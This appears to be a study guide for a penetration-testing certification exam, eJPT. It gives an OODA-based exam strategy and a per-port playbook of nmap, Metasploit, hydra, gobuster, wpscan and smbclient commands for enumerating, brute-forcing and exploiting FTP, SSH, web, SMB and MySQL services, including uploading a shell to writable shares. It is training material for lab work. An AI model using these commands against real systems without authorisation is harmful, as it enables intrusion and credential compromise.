# Summary
This strategic guide provides mandatory protocols for the exam's unique constraints and uses OODA-based troubleshooting loops to follow best-practice operations and overcome common "stuck" points in reconnaissance, exploitation, and pivoting.

# Before the Beginning

This section provides a high-level OODA loop to guide the entire 48-hour examination.

- Observe (Observe the battlefield) — first 30 minutes
  - Read all 35 questions
  - Read and comprehend the core table (minimum pass mark)
  - Read and internalize the examination constraints (no internet access, dynamic Flags)

- Orient (Adjust mindset) — most critical strategic step
  - The exam is not a "pwn-all-machines" CTF. It is a "document-all-findings" audit.
  - Meticulous enumeration and documentation outweigh exploitation.

- Decide (Establish Engagement Rules)
  - Follow a problem-driven attack model. These 35 issues form the map.
  - Adopt a dual-brain strategy and flag submission protocol as mandatory, inviolable rules.
  - Do not become bogged down on a single exploit for more than 30 minutes. Pivot to alternative targets, gathering additional assessment score points which (with a minimum threshold of 90%) hold greater value than exploitation (minimum threshold of 70%).

- Act (Execution)
  - Enter the second phase (tactical setup and reconnaissance) with this reinforced, resilient mindset.

| Domain                        | Weight | Key Skills                                                                                                                    | Minimum Score |
| ----------------------------- | ------ | ----------------------------------------------------------------------------------------------------------------------------- | ------------- |
| Assessment Methodologies      | 25%    | Host discovery (`nmap -sn`), port/service/OS identification (`nmap -sV -sC -O`), vulnerability identification (`searchsploit`) | 90%           |
| Host & Network Auditing       | 25%    | System/user enumeration, credential dumping, file transfer                                                                    | 80%           |
| Host & Network Penetration    | 35%    | Exploitation (Metasploit Framework), brute force (hydra), pivoting                                                            | 70%           |
| Web Application               | 15%    | Directory enumeration (gobuster), CMS scanning (wpscan), SQL injection, cross-site scripting                                  | 60%           |

# Tactical Deployment and Reconnaissance

## Metasploit Framework Initiation and Verification Workflow

The Metasploit database serves as the core strategic tool for managing operational cognitive load.

```bash
service postgresql start && msfconsole
msf6 > db_status
msf6 > workspace -a lab
```

## Network and Service Reconnaissance

The objective at this stage is to construct a comprehensive map of the network.

### Host Discovery

```bash
nmap -sn <target_ip_range>
```

### Service and Port Scanning

```bash
nmap -sV -sC -O -p- <target_ip> -oX v_<target_ip>.xml
```

### Import Nmap Results into Metasploit

```text
msf6 > db_import v_<target_ip>.xml
msf6 > hosts
msf6 > setg RHOSTS <target_ip>
msf6 > setg RHOST <target_ip>
```

## The OODA Loop in the Reconnaissance Phase (Troubleshooting)

### Issue 1

- Orient (Positioning issue): `nmap -sn` scan shows zero hosts, or `nmap -sV` scan indicates all ports are "filtered".
- Decide (Determine Diagnostic Action):
  1. Re-Orient (Tool Failure): `nmap -sn` (ICMP Ping) is frequently blocked by firewalls. `nmap -sV` (default SYN scan) may also be blocked.
  2. Re-Decide (Switch Tools)
- Act:
  1. Use `sudo arp-scan -I eth0 <RANGE>`. ARP operates at Layer 2 and is virtually unfiltered on the local subnet. This is the most reliable host discovery method.
  2. For port scanning, switch to a full TCP Connect scan: `nmap -sT -Pn <target_ip>`. `-sT` is noisier but more reliable against simple firewalls. `-Pn` skips (potentially failing) host discovery pings.
- Re-Orient (Self-Check): Is your own machine configured correctly? Check `ip a` on Kali. Are you on the correct VPN interface (`tun0`)? Are you scanning the correct subnet?

# Attack Playbook (Enumeration and Exploitation)

## Port 21: FTP

### Scan

```bash
nmap -p 21 --script=ftp-anon <target_ip>
```

### Manual Enumeration

```bash
ftp <target_ip>
```
- Use `anonymous` as username and empty password to log in.

### MSF Enumeration

```text
msf6 > use auxiliary/scanner/ftp/anonymous
```

### Exploitation

- If Nmap results indicate "Anonymous FTP login permitted" with write access (WA WRITE), proceed immediately to payload delivery using `put shell.exe`.
- If banner = `vsftpd 2.3.4`:
  ```text
  msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
  ```
- If banner = `ProFTPD 1.3.3c`:
  ```text
  msf6 > use exploit/unix/ftp/proftpd_133c_backdoor
  ```
- Brute force:
  ```bash
  hydra -L <user_file> -P <password_file> ftp://<target_ip>
  ```

## Port 22: SSH

### Scan

```bash
nmap -p 22 --script=ssh-auth-methods <target_ip>
```

### Manual Enumeration

```bash
nc -nv <target_ip> 22
```

### Exploitation

- If banner contains `libssh`:
  ```text
  msf6 > use auxiliary/scanner/ssh/libssh_auth_bypass
  ```
- Brute force:
  ```bash
  hydra -L <user_file> -P <password_file> ssh://<target_ip>
  ```

## Port 80/443: HTTP/S

### Scan

```bash
nmap -p 80,443 --script=http-* <target_ip>
```

### File/Directory Enumeration

```bash
gobuster dir -u http://<target_ip> -w /usr/share/wordlists/dirb/common.txt -x php,txt,git
```

- Web Reconnaissance Quick Checklist
  - After running Gobuster, manually inspect the following common files and directories (key sources of information within the eJPT practice lab):
    - robots.txt: Examine the `Disallow:` entries, which typically point to hidden administrative pages.
    - wp-config.php/wp-config.bak: Often contain plaintext database credentials.
    - phpinfo.php: Leaks detailed PHP configuration and server variables.

### CMS Scan

```bash
wpscan --url http://<target_ip> --enumerate u,p,t,vp
```

- Options reference:
  - `--url <URL>`: Target URL
  - `--enumerate p`: Enumerate popular plugins
  - `--enumerate ap`: Enumerate all plugins (takes considerable time)
  - `--enumerate t`: Enumerate popular themes
  - `--enumerate at`: Enumerate all themes
  - `--enumerate vp`: Enumerate vulnerable plugins (most commonly used)

### WebDAV Enumeration

```bash
davtest -url http://<target_ip>/webdav
```

### MSF Enumeration

```text
msf6 > use auxiliary/scanner/http/dir scanner
msf6 > use auxiliary/scanner/http/http_put
```

### Exploitation

- If `auxiliary/scanner/http/http_put` reports "PUT is allowed"
    ```text
    msf6 > use exploit/windows/iis/iis_webdav_upload_asp
    ```

- If Banner = "HTTP File Server 2.3x" 
    ```text
    msf6 > use exploit/windows/http/rejetto_hfs_exec
    ```

- If Banner = "BadBlue 2.72b"
    ```text
    msf6 > use exploit/windows/http/badblue_passthru
    ```

- If obtain Tomcat Management Credentials
    ```text
    msf6 > use exploit/multi/http/tomcat_jsp_upload_bypass 
    ```

- If find Local File Inclusion and Remote File Inclusion
    Switch to the LFI/RFI & Web Attack Payloads Quick Reference Guide

### Brute Force

```bash
hydra -l admin -P rockyou.txt <TARGET_IP> http-post-form \"/login.php:username=^USER^&password=^PASS^:F=<failed_message>"
```

- Parameter Description
    - `username` and `password` is the value name defined by web application, and they can be various in different website, e.g. some sites use `user` and `password`.
    -  `^USER^` and `^PASS^`: Hydra placeholders.
    - `F=<failed_message>`: `F=` specifies the distinctive string returned on the page following a failed login.

## Port 139/445: SMB

### Scan

```bash
nmap -p 139,445 --script=smb-enum-shares,smb-enum-users,smb-protocols <target_ip>
```

### Automatic Enumeration

```bash
enum4linux -a <target_ip>
```

- Options reference:
    - `-a`: Run all enumerations (legacy).
    - `-U`: Enumerate users.
    - `-S`: Enumerate shares.
    - `-G`: Enumerate groups and members.
    - `-r`: RID cycling (used to find users).

### Manual Enumeration

```bash
smbmap -H <target_ip>: (Empty session) List shares and permissions.
smbmap -H <target_ip> -u <user> -p <pass>: List shares and permissions using credentials。
smbmap -H <target_ip> -r <share>: Recursively list shared memory
```

### Exploitation

- If smb enumshares detects anonymous writable shares (ANON WRITE) 

    ```bash
    smbclient //<target_ip>/<ShareName> -N
    put shell.exe
    ```

- If Banner = "Samba 3.5.0-4.6.4" and have a writable share

    ```text
    msf6 > use exploit/linux/samba/is_knwon_pipename
    ```

- If brute force attack succeed (admin user only)

    ```text
    msf6 > use exploit/windows/smb/psexec
    ```

- If brute force attack succeed (but not admin user)

    ```bash
    smbclient //<target_ip>/<ShareName> -U 'username%password'
    put shell.exe
    ```

### Brute Force

```bash
hydra -L <user_file> -P <password_file> //<target_ip> smb
```

## Port 3306: MySQL

### Scan

```bash
nmap -p 3306 --script mysql-info <target_ip>
```

### Brute Force

```bash
hydra -L <user_file> -P <password_file> //<target_ip> mysql
```